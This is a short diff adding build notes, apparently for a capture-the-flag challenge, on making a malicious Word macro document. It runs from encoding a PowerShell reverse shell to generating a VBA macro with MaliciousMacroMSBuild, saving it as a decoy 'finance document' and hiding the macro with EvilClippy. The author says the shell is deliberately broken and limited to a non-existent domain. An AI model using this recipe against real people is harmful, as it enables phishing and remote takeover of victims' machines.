@@ -1,0 +1,14 @@
+to build
+make payload with 
+https://raikia.com/tool-powershell-encoder/
+put that into powershellReverse.b64
+then
+https://github.com/infosecn1nja/MaliciousMacroMSBuild
+the malicious macro won't do anything anyway since the malicious code (reverse shell) has invalid code since it contains the flag but -d can be added so malicious macro only runs on specific/non-existent domain
+run: python2 m3-gen.py -i powershellReverse.b64 -p powershell -o payload.vba -d SOMEDOMAINTHATDOESNTEXIST
+Using microsoft word, put payload in document
+save as macro format called finance document.docm
+then
+https://github.com/outflanknl/EvilClippy
+run: EvilClippy.exe -g -u -s fakecode.vba finance document.docm
+job done
